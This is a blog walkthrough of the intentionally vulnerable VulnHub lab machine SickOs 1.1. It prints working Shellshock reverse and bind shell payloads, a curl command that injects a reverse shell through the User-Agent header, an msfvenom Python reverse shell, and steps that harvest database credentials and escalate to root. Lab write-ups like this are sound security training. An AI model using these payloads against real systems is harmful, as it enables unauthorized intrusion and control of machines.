# VulnHub - SickOs: 1.1 (In Detail)

_8 min read · February 10, 2026 · by qs18_

---

## Entry Log

In this mini-blog, I’ll be showing you the walkthrough for [**SickOs: 1.1**](https://www.vulnhub.com/entry/sickos-11,132/) machine from [**VulnHub**](https://www.vulnhub.com/about/).

- Goal: Obtain `a0216ea4d51874464078c618298b1367.txt` in Root
- Difficulty: Easy
- Machine Author: D4rk

---

## Getting the Machine IP Address

As usual:

```bash
sudo netdiscover -i eth0 -r 192.168.11.0/24
```

In my case, the machine IP address is **192.168.11.140**.

## Scanning for Open Ports

Again as usual:

```bash
sudo nmap -p- -sCV 192.168.11.140
```

![Nmap Output](./img/vulnhub-sickos1.1/Nmap-output.png)

From the scan result, I noticed that:

- SSH (port 22) is open.
- HTTP is running but in port **3128** which indicates a proxy service instead of a normal web server.

So I configured my browser to use `192.168.11.140:3128` as an HTTP proxy.

![Proxy Configuration](./img/vulnhub-sickos1.1/proxy-config.png)

After configuring the proxy, I accessed the site.

![SickOs: 1.1 Website](./img/vulnhub-sickos1.1/web.png)

The page itself did not reveal anything interesting, even after inspecting the source code.

---

## Further Enumeration on the Website

I proceeded with directory enumeration using [**dirsearch**](https://www.kali.org/tools/dirsearch/).

```bash
dirsearch -u http://192.168.11.140 --proxy http://192.168.11.140:3128
```

- -u → url.

![Dirsearch Output](./img/vulnhub-sickos1.1/Dirsearch-output.png)

I found `robots.txt`, so I retrieved it using [**curl**](https://www.kali.org/tools/curl/).

```bash
curl -v http://192.168.11.140/robots.txt -x http://192.168.11.140:3128
```

- -v → Verbose.
- -x → Proxy.

```output
User-agent: *
Disallow: /
Dissalow: /wolfcms
```

I navigated to `/wolfcms` :

![SickOs: 1.1 Website - WolfCMS](./img/vulnhub-sickos1.1/web-wolfcms.png)

This site was running **Wolf CMS**. I did some google search on Wolf CMS vulnerabilities, but I didn’t find anything useful.

---

## Further Further Enumeration

I ran [**Nikto**](https://www.kali.org/tools/nikto/) on the target:

```bash
nikto -h http://192.168.11.140 -useproxy http://192.168.11.140:3128
```

![Nikto Output](./img/vulnhub-sickos1.1/Nikto-output.png)

The result shows that the server might be vulnerable to [Shellshock (CVE-2014-6278)](https://nvd.nist.gov/vuln/detail/cve-2014-6278).

Based on the Nikto output, I checked the following CGI endpoint:

```bash
curl -v http://192.168.11.140/cgi-bin/status -x http://192.168.11.140:3128
```

```output
{ "uptime": " 10:05:50 up 1:20, 0 users, load average: 0.01, 0.02, 0.05", "kernel": "Linux SickOs 3.11.0-15-generic #25~precise1-Ubuntu SMP Thu Jan 30 17:42:40 UTC 2014 i686 i686 i386 GNU/Linux"}
```

The response confirmed that the script was accessible and executing system commands.

After researching the vulnerability, I found a relevant exploit on [Exploit-DB](https://www.exploit-db.com/exploits/34900).

```bash
if args['payload'] == 'reverse':
	try:
		lhost = args['lhost']
		lport = int(args['lport'])
		rhost = args['rhost']
		payload = "() { :;}; /bin/bash -c /bin/bash -i >& /dev/tcp/"+lhost+"/"+str(lport)+" 0>&1 &"
	except:
		usage()
elif args['payload'] == 'bind':
	try:
		rhost = args['rhost']
		rport = args['rport']
		payload = "() { :;}; /bin/bash -c 'nc -l -p "+rport+" -e /bin/bash &'"
	except:
		usage()
```

From the exploit above, I extracted the reverse shell payload and modified it with my own IP address and port:

```bash
() { :;}; /bin/bash -c /bin/bash -i >& /dev/tcp/192.168.11.138/4444 0>&1 &
```

I then set up a [**Netcat**](https://www.kali.org/tools/netcat/) listener on my machine:

```bash
nc -lvp 4444
```

To trigger the vulnerability, I sent the payload via the `User-Agent` HTTP header:

```bash
curl -v http://192.168.11.140/cgi-bin/status \
> -x http://192.168.11.140:3128 \
> -H 'User-Agent: () { :; }; /bin/bash -c /bin/bash -i >& /dev/tcp/192.168.11.138/4444 0>&1 &'
```

- -H → Header.
- () { :; }; → Shellshock function declaration.

![Curl Reverse Shell Output](./img/vulnhub-sickos1.1/curl-rev-shell.png)

After receiving a reverse shell, I made it interactive TTY.

```bash
python -c 'import pty;pty.spawn("/bin/bash")'
```

---

## Post-Exploitation Enumeration

I checked for SUID files, but nothing useful there.

```bash
find / -perm -4000 2>/dev/null
```

I also checked for user accounts and found that there was only one which is **sickos**.

```bash
cd /home
ls
```

Then I navigated back to `/var/www` to look for configurations files.

```bash
cd /var/www
ls
```

```output
connect.py
index.php
robots.txt
wolfcms
```

In here, I also found `connect.py` which can be used for reverse shell (I’ve included this at the end of this post).

I entered `wolfcms` directory:

```bash
cd wolfcms
ls
```

```output
CONTRIBUTING.md
README.md
composer.json
config.php
docs
favicon.ico
index.php
public
robots.txt
wolf
```

Then I found the `config.php` .

```bash
cat config.php
```

![Database Credentials](./img/vulnhub-sickos1.1/db-creds.png)

I got the database credentials.

- Username → root
- Password → john@123
- Database name → wolf

I logged in to `mysql`

```bash
mysql -u root -p
john@123
```

and retrieved the user credentials.

```bash
show databases;
use wolf;
select * from user;
```

![User Credentials](./img/vulnhub-sickos1.1/user-creds.png)

However, there was nothing useful here.

---

## Credential Reuse & Privilege Escalation

Since there was only one user (**sickos**), I attempted **credential reuse** by using the database password for this user.

```bash
su sickos
john@123
```

The password worked successfully.

I then checked what sickos is allowed to run with `sudo`.

```bash
sudo -l
```

![sickos sudo Permission](./img/vulnhub-sickos1.1/sickos-sudo-l.png)

**sickos** could run all commands as root. Therefore I escalated privileges by switching to `sudo`.

```bash
sudo su
```

![Switching to sudo](./img/vulnhub-sickos1.1/su-sudo.png)

Then I navigated to `/root` and read the flag.

```bash
cd /root
ls
cat a0216ea4d51874464078c618298b1367.txt
```

![Flag](./img/vulnhub-sickos1.1/flag-m1.png)

Bomba! Settleee.

---

## Alt Method (Python Reverse Shell)

I generated Python reverse shell payload using [**Metasploit**](https://docs.metasploit.com/).

```bash
msfvenom -p cmd/unix/reverse_python LHOST=192.168.11.138 LPORT=4477
```

![MSF Payload Output](./img/vulnhub-sickos1.1/msf-payload.png)

I copied the generated payload → “exec … )))”

Then, I set up Netcat listener again:

```bash
nc -lvp 4477
```

And in the target shell:

```bash
echo *paste_here* > connect.py
```

Then I became root.

![Flag](./img/vulnhub-sickos1.1/flag-m2.png)

Bomba! Settleee.

---

## Session Terminated

SickOs 1.1 is an easy machine that focuses heavily on understanding how legacy web technologies and simple misconfigurations can still lead to full system compromise. From this machine, I learned how to:

- identify and exploit CGI-based vulnerabilities (Shellshock)
- understand why `/cgi-bin` endpoints are high-value targets
- abuse HTTP headers (such as `User-Agent`) for command execution
- extract credentials from CMS configuration files
- apply credential reuse against local system users
- escalate privileges instantly via misconfigured sudo permissions

Overall, this lab reinforced the importance of not overlooking old vulnerabilities and always testing simple attack paths before moving on to complex ones. Enumeration is everything. Thank you for reading and see you next time!
